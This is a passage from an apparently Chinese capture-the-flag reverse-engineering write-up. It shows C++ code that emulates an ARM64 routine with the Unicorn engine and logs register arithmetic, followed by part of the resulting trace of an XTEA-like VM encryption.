operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W0 ^ W3 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w3<span class=\"token punctuation\">,</span> w3 <span class=\"token operator\">^</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x2180</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W4<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W1 = W1 ^ W4 --- %llx ^ %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w4<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">^</span> w4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x1CC4</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">+</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address <span class=\"token operator\">==</span> <span class=\"token number\">0x1A0C</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W0<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">uc_reg_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> UC_ARM64_REG_W1<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>w1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"W2 = W1 + W0 --- %llx + %llx = %llx\\n\"</span><span class=\"token punctuation\">,</span> w1<span class=\"token punctuation\">,</span> w0<span class=\"token punctuation\">,</span> w1 <span class=\"token operator\">+</span> w0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint8_t</span> Input<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"11112222111111111111111111111111\"</span><span class=\"token punctuation\">;</span>\n    uc_engine<span class=\"token operator\">*</span> uc<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    uc_hook hook<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> InputAddr <span class=\"token operator\">=</span> <span class=\"token number\">0x14C28</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> Stack <span class=\"token operator\">=</span> <span class=\"token number\">0x7F0000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint8_t</span> MyEncFlag<span class=\"token punctuation\">[</span><span class=\"token number\">100</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint64_t</span> Base <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000001000000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_open</span><span class=\"token punctuation\">(</span>uc_arch<span class=\"token double-colon punctuation\">::</span>UC_ARCH_ARM64<span class=\"token punctuation\">,</span> uc_mode<span class=\"token double-colon punctuation\">::</span>UC_MODE_ARM<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>uc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_map</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> Base<span class=\"token punctuation\">,</span> UC_PROT_ALL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_map</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> Stack <span class=\"token operator\">-</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4000</span><span class=\"token punctuation\">,</span> UC_PROT_ALL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_hook_add</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>hook<span class=\"token punctuation\">,</span> UC_HOOK_CODE<span class=\"token punctuation\">,</span> hook_code<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x14C28</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Input<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C70</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Code<span class=\"token punctuation\">,</span> <span class=\"token number\">8840u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x14010</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span>Data1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x30F0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Data2<span class=\"token punctuation\">,</span> <span class=\"token number\">0x54u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_mem_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x149E8</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Data3<span class=\"token punctuation\">,</span> <span class=\"token number\">8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">uc_reg_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>InputAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// X0</span>\n    <span class=\"token function\">uc_reg_write</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>Stack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// SP</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">uc_emu_start</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2EF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">uc_mem_read</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">,</span> InputAddr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>MyEncFlag<span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%X \"</span><span class=\"token punctuation\">,</span> MyEncFlag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">uc_close</span><span class=\"token punctuation\">(</span>uc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n\n<p>最后运行输出得到一个vm加密流程</p>\n<p>以下是部分输出内容。</p>\n<p>output:</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\">W3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">1919191</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> c8c8c8c80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1919191</span> <span class=\"token operator\">^</span> <span class=\"token number\">8</span>c8c8c80 <span class=\"token operator\">=</span> <span class=\"token number\">8</span>d1d1d11\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">23100176</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">8</span>d1d1d11 <span class=\"token operator\">+</span> <span class=\"token number\">23100176</span> <span class=\"token operator\">=</span> b02d1e87\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> <span class=\"token number\">0</span> <span class=\"token operator\">=</span> <span class=\"token number\">776f</span>6853\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> dcc47a41\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> b02d1e87 <span class=\"token operator\">^</span> dcc47a41 <span class=\"token operator\">=</span> <span class=\"token number\">6</span>ce964c6\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">6</span>ce964c6 <span class=\"token operator\">+</span> <span class=\"token number\">31313131</span> <span class=\"token operator\">=</span> <span class=\"token number\">9e1</span>a95f7\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> <span class=\"token number\">9e1</span>a95f\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">4f</span>0d4afb80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f <span class=\"token operator\">^</span> d4afb80 <span class=\"token operator\">=</span> <span class=\"token number\">4</span>ab52df\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> cb7ce27f\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">4</span>ab52df <span class=\"token operator\">+</span> cb7ce27f <span class=\"token operator\">=</span> d028355e\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> bebfc\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bebfc <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">776f</span>6853 <span class=\"token operator\">+</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">=</span> d6cf4f3a\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d6cf4f3a <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> f5ec1a5c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f5ec1a5c <span class=\"token operator\">^</span> d028355e <span class=\"token operator\">=</span> <span class=\"token number\">25</span>c42f02\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">25</span>c42f02 <span class=\"token operator\">+</span> <span class=\"token number\">32323232</span> <span class=\"token operator\">=</span> <span class=\"token number\">57f</span>66134\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>bfb309\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">15f</span>d984d00\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">2</span>bfb309 <span class=\"token operator\">^</span> fd984d00 <span class=\"token operator\">=</span> ff27fe09\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> <span class=\"token number\">46</span>d45270\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> ff27fe09 <span class=\"token operator\">+</span> <span class=\"token number\">46</span>d45270 <span class=\"token operator\">=</span> <span class=\"token number\">145f</span>c5079\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">74696564</span> <span class=\"token operator\">+</span> <span class=\"token number\">5f</span>5fe6e7 <span class=\"token operator\">=</span> d3c94c4b\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d3c94c4b <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">78625e59</span>\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">45f</span>c5079 <span class=\"token operator\">^</span> <span class=\"token number\">78625e59</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span>d9e0e20\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>d9e0e20 <span class=\"token operator\">+</span> <span class=\"token number\">9e1</span>a95f7 <span class=\"token operator\">=</span> dbb8a417\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a417 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> dbb8a41\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a417 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span>ddc520b80\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a41 <span class=\"token operator\">^</span> dc520b80 <span class=\"token operator\">=</span> d1e981c1\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> dbb8a417 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span>eded39f\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> d1e981c1 <span class=\"token operator\">+</span> <span class=\"token number\">8</span>eded39f <span class=\"token operator\">=</span> <span class=\"token number\">160</span>c85560\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bebfcdce <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">17</span>d7f9\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">17</span>d7f9 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">656</span>b616d <span class=\"token operator\">+</span> bebfcdce <span class=\"token operator\">=</span> <span class=\"token number\">1242</span>b2f3b\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">242</span>b2f3b <span class=\"token operator\">^</span> <span class=\"token number\">23235566</span> <span class=\"token operator\">=</span> <span class=\"token number\">7087</span>a5d\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">7087</span>a5d <span class=\"token operator\">^</span> <span class=\"token number\">60</span>c85560 <span class=\"token operator\">=</span> <span class=\"token number\">67</span>c02f3d\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">67</span>c02f3d <span class=\"token operator\">+</span> <span class=\"token number\">57f</span>66134 <span class=\"token operator\">=</span> bfb69071\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfb69071 <span class=\"token operator\">>></span> <span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token number\">5f</span>db483\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfb69071 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">6</span> <span class=\"token operator\">=</span> <span class=\"token number\">2f</span>eda41c40\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">5f</span>db483 <span class=\"token operator\">^</span> eda41c40 <span class=\"token operator\">=</span> e859a8c3\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bfb69071 <span class=\"token operator\">^</span> <span class=\"token number\">11223344</span> <span class=\"token operator\">=</span> ae94a335\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> e859a8c3 <span class=\"token operator\">+</span> ae94a335 <span class=\"token operator\">=</span> <span class=\"token number\">196</span>ee4bf8\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> bebfcdce <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> bebfcdce <span class=\"token operator\">=</span> <span class=\"token number\">1202</span>d2d40\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">202</span>d2d40 <span class=\"token operator\">^</span> abab1212 <span class=\"token operator\">=</span> <span class=\"token number\">8</span>b863f52\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">96</span>ee4bf8 <span class=\"token operator\">^</span> <span class=\"token number\">8</span>b863f52 <span class=\"token operator\">=</span> <span class=\"token number\">1</span>d6874aa\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1</span>d6874aa <span class=\"token operator\">+</span> dbb8a417 <span class=\"token operator\">=</span> f92118c1\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c1 <span class=\"token operator\">>></span> <span class=\"token number\">4</span> <span class=\"token operator\">=</span> f92118c\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">&lt;&lt;</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">7</span> <span class=\"token operator\">=</span> <span class=\"token number\">7</span>c908c6080\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">^</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c <span class=\"token operator\">^</span> <span class=\"token number\">908</span>c6080 <span class=\"token operator\">=</span> <span class=\"token number\">9f</span>1e710c\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">^</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> f92118c1 <span class=\"token operator\">^</span> <span class=\"token number\">55667788</span> <span class=\"token operator\">=</span> ac476f49\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">9f</span>1e710c <span class=\"token operator\">+</span> ac476f49 <span class=\"token operator\">=</span> <span class=\"token number\">14</span>b65e055\nW3 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">>></span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">>></span> b <span class=\"token operator\">=</span> <span class=\"token number\">3</span>c3f6\nW2 <span class=\"token operator\">=</span> W0 <span class=\"token operator\">&amp;</span> W3 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">3</span>c3f6 <span class=\"token operator\">&amp;</span> <span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token number\">2</span>\nW2 <span class=\"token operator\">=</span> W1 <span class=\"token operator\">+</span> W0 <span class=\"token operator\">--</span><span class=\"token operator\">-</span> <span class=\"token number\">616</span>d5f72 <span class=\"token operator\">+</span> <span class=\"token number\">1e1f</span>b4b5 <span class=\"token operator\">=</span> <span class=\"token number\">7f</span>8d1427\nW2 <span class=\"token operator\">=</span> W0 